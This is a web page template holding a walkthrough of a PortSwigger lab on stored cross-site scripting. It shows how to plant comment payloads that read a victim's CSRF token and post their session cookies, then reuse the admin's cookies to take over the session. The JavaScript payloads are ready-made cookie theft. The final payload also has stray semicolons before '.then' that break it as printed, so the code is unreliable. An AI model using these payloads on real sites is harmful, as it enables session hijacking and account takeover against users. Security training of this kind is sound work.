{% extends "base.html" %}{% block title %}Exploiting cross-site scripting to steal cookies{%endblock%}
{% block content %}
        <h1 id="typing-effect" class="display-2 mb-4"></h1>
        <p>
            <b class="solution-title">Solution</b>
        </p>
        <p class="solution-text no-indent">
            Similarly to the previous <a class="fake-link" target="blank" href="xss13">lab</a>, we will be exploiting a stored XSS vulnerability to execute a CSRF attack and hijack the admin's session by getting its cookies. The lab instructions state that the XSS vulnerability is present in the comment section of the blog posts. 
            We can access this lab by clicking <a class="fake-link" target="blank" href="https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-perform-csrf">here</a>. 
        </p>
        <p class="solution-text no-indent">
            We can test the presence of XSS vulnerability by simply passing as a comment the following payload: &lt;script&gt;alert(1)&lt;/script&gt; and visiting the page back again.
        </p>
        <div class="fig-breath">
            <img class="fig-body" src="{{ url_for('static', filename='img/xss14-img1.png') }}">
        </div> 
        <p class="solution-text no-indent">
            To solve this lab without leaving a trace, we require BurpSuite Professional. However, we can still solve it by escalating our XSS to a CSRF in the comment sections and stealing a user's cookies instead of changing their email, as we did before. Our initial payload will test how we can display our session cookie in a comment every time we access the blog post we commented on with our payload. To do this, we need to open and run BurpSuite and capture the POST request that occurs when we post a comment on the blog.
        </p>
        <div class="fig-breath">
            <img class="fig-body" src="{{ url_for('static', filename='img/xss14-img2.png') }}">
        </div> 
        <p class="solution-text no-indent">
            Note that the body request has several parameters, including 'csrf', an anti-csrf token, 'postId', which refers to the blog post identifier, 'comment', which includes the text we entered in the comment box, 'name', which is the name we provided, and 'email' and 'website'. However, the csrf token poses a problem since it varies based on the user making the request. Nevertheless, our primary objective with our initial payload is to test if we can display our session cookies through a POST request when we load the infected blog post. We can accomplish this by utilizing the fetch method we have used in the previous lab.
        </p>
        <div class="shrink">
            <pre>
                <code id="text" class="hljs language-js">
                    fetch('https://ID-OF-YOUR-LAB.web-security-academy.net/post/comment', {
                        method: 'POST',
                        mode: 'no-cors',
                        body: `csrf=OUR-TOKEN&postId=10&comment=${document.cookie}&name=1nv4lid&email=a@a.com&website=`
                      });
                </code>
            </pre>
        </div>         
        <div class="fig-breath">
            <img class="fig-body" src="{{ url_for('static', filename='img/xss14-img3.png') }}">
        </div> 
        <p class="solution-text no-indent">
            Do not forget to wrap the payload in between script tags! 
            In this case, every time we access the blog post with ID=10, a comment will be generated by someone named 1nv4lid containing our current session cookies.
        </p>
        <div class="fig-breath">
            <img class="fig-body" src="{{ url_for('static', filename='img/xss14-img4.png') }}">
        </div> 
        <p class="solution-text no-indent">
            Having learned how to exploit the vulnerability to display our session cookie, our next step is to bypass the csrf token and enable our script payload to hijack the admin's session cookies. To achieve this, we can modify our payload to capture the csrf token of the user's session via a GET request. It's worth noting that this is achievable since the csrf token is embedded within the source code of the page, meaning we don't need to know the user's token to use it. The following payload should suffice:
        </p>
        <div class="shrink">
            <pre>
                <code id="text" class="hljs language-js">
                    fetch('https://ID-OF-YOUR-LAB.web-security-academy.net/post?postId=10');
                    .then(response =&gt; response.text());
                    .then(text =&gt; {
                        const token = text.match(/name="csrf" value="(\w+)"/)[1];
                        return fetch('https://ID-OF-YOUR-LAB.web-security-academy.net/post/comment', {
                            method: 'POST',
                            mode: 'no-cors',
                            body: `csrf=${token}&amp;postId=10&amp;comment=admin+cookies+are+${document.cookie}&amp;name=1nv4lid&amp;email=a@a.com&amp;website=`
                        });
                    });
                </code>
            </pre>
        </div>
        <div class="fig-breath">
            <img class="fig-body" src="{{ url_for('static', filename='img/xss14-img5.png') }}">
        </div> 
        <p class="solution-text no-indent">
            After passing this payload and reloading the blog post id=10, we find the following:
        </p>
        <div class="fig-breath">
            <img class="fig-body" src="{{ url_for('static', filename='img/xss14-img6.png') }}">
        </div> 
        <p class="solution-text no-indent">
            Now, we reload the '/' page and intercept the request, substituting the cookies with the admin's ones found with this procedure!
        </p>
        <div class="fig-breath">
            <img class="fig-body" src="{{ url_for('static', filename='img/xss14-img7.png') }}">
        </div> 
        <p class="solution-text no-indent">
            Solving the lab!
        </p>
        <div class="fig-breath">
            <img class="fig-body" src="{{ url_for('static', filename='img/xss14-img8.png') }}">
        </div> 
        <a href="/labs">Go back</a>
{%endblock%}